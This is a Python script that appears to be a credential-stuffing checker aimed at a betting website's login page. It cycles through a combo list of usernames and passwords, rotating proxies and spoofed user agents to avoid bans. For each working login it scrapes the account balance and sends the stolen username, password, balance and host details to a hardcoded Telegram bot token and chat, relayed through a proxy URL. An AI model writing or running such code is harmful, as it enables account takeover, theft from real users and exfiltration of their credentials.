from robobrowser import RoboBrowser
import os
import random
import sys
import time
import jdatetime
import platform
import requests
from colorama import *
import urllib.request
import re
from bs4 import BeautifulSoup
from telegram.ext import Updater , CommandHandler
import fake_useragent
from proxymanager import ProxyManager

chat_id='-1001499475544'
uid2=os.getlogin()
uid=platform.node()
sucs='class="logout"'
fail1='"/Account/ResendActivationEmail"'
fail2='"validation-summary-errors"'
cap='"balance last">'
counter=0
api_url ='http://mmcc.thats.im/cgi-gin/index.php?q=https://api.telegram.org/bot623368109:AAGr_x6viF-ek7gXImdY4ANyu48sj8iFPdg/sendMessage'

result_path = (os.path.join(sys.path[0])+'/goods.txt')
###################################################################
##########################################################

def save_result(goods_list):
    print('s-1')
    with open(result_path, 'w+') as fd:
        print('s-2')
        fd.write("{}".format(goods_list))
    print('Combo Saved')
#############################################################################
###########################################################################


proxi2=(os.path.join(sys.path[0])+'/proxy.txt')
pr=open(proxi2,'r')
pix=list()
for line in pr:
    pix.append(pr.readline().replace('\n',''))
#print(pix)
prox = {
    'http': 'http://{}'.format(random.choice(pix)),
    #'http': 'http://138.68.182.14:8080',
    #'https': 'http://163.172.86.64:3128',
}
#=============================================
proxi=ProxyManager(os.path.join(sys.path[0])+'/\proxy.txt')
#print('proxy read')
#proxy = str(random.choice(pix))

############################################################
ua = fake_useragent.UserAgent(cache=True,verify_ssl=False,use_cache_server=False)
#print(ua.random)

comboo=(os.path.join(sys.path[0])+'/combo.txt')
combo_path =comboo
fp=open(combo_path,'r')
fp1=open(combo_path,'r')
lines = len(fp1.readlines())
linecount=0
print(lines)
lines_seen = set()

#session.proxies={'http': 'http://{}'.format(random.choice(pix))}
#rb = RoboBrowser(parser='lxml',history=True,session=session,user_agent=ua.random)
############################################################################################
'''def proxii():
    print('p-1')
    
    rand_prox=(proxi.random_proxy())
    
    self.rand_prox'''
####################

def browse(usr,pas):
    print('b-1')
    rand_prox=(proxi.random_proxy())
    print(rand_prox.get_dict())
    ses=requests.Session()
    print('b-2')
    ses.verify=False
    print('b-3')
    ses.proxies=rand_prox.get_dict()
    print('b-4')
    #ip=ses.get("https://api.ipify.org/").read()
    #print (str(ip)[2:-1])
    rb = RoboBrowser(session=ses,parser='lxml',user_agent=ua.random,cache=False,allow_redirects=True,tries=3,timeout=20,history=False)
    print('b-5')
    #rb.open('https://api.ipify.org/')
    #print(str(rb.parsed()).encode())
    rb.open('https://www.win6etyes.xyz/Account/Login')
    print('b-6')
    form=rb.get_form()
    print ('b-7')
    form['UserName']=usr
    print('b-8')
    form['Password']=pas
    print ('b-9')
    rb.submit_form(form)
    print ('b-10')

    src1=str(rb.parsed()).encode()
    print ('b-11')
    src=(str(src1))
    print(src[0:10])
    return src

for line in fp:
    count=0
    while count <= 15:
                #proxy = str(random.choice(pix))
                #os.environ['http_proxy'] =proxy
                #os.environ['HTTP_PROXY'] =proxy
                #os.environ['https_proxy'] =proxy
                #os.environ['HTTPS_PROXY'] =proxy 
                try:

                    print(line)
                    
                    #if line in lines_seen:
                    #    line = fp.readline()
                    #    print(line)
                    #else: 
                    #    continue
                    #print('Random Proxy='+proxy)
        

                        
                    print('f-1')
                    #ip=ses.get("https://api.ipify.org/").read()
                    #print (str(ip)[2:-1])
                    #print('Proxy Selected')
                    combo = line
                    print('f-2')
                    combo_array = combo.split(':')
                    username = combo_array[0]
                    print(username)
                    password = combo_array[1].replace("\n",'')
                    print(password)
                    #proxii()
                    print ('f-3')
                    
                    src2=browse(username,password)
                    
                    print ('f-4')
                    
                    

                    print ('f-5')
                    print(src2[0:100])
                    print ('f-6')

                            

                    if fail1 in src2:
                        print (fail1)
                    
                    elif fail2 in src2:
                        print(fail2)
                    elif sucs in src2:
                            print('f-7')
                            b1=src2.find(cap)
                            print('f-8')
                            b2=b1+65
                            print('f-9')
                            balance=(src2[b1:b2].split())
                            print(balance)
                            counter=counter+1
                            goods_list="{}:{}:{}\n".format(username,password,balance)
                            msg=(str(time.asctime())+"\n"+str(jdatetime.date.today())+"\n"+uid2+'\nSystem ID:'+uid+'\n\nHit Number '+goods_list)
                            print(msg)
                            params = {'chat_id': chat_id, 'text': msg}
                            requests.post(api_url, params)
                            
                            
                            print(sucs)
                            save_result(goods_list)
                    #elif:
                        
                    #line = fp.readline()
                    lines_seen.add(line)
                    linecount=linecount+1
                    #print(linecount) 
                    print('Done')
                    
                    requests.post('https://api.telegram.org/bot623368109:AAGr_x6viF-ek7gXImdY4ANyu48sj8iFPdg/editMessageText', 'updated')
                    break
                except: 
                    print ('Banned Proxy reTrying Again:  ')
                    
                    count += 1
                    print('Trying Times:'+str(count))
                    

###################################
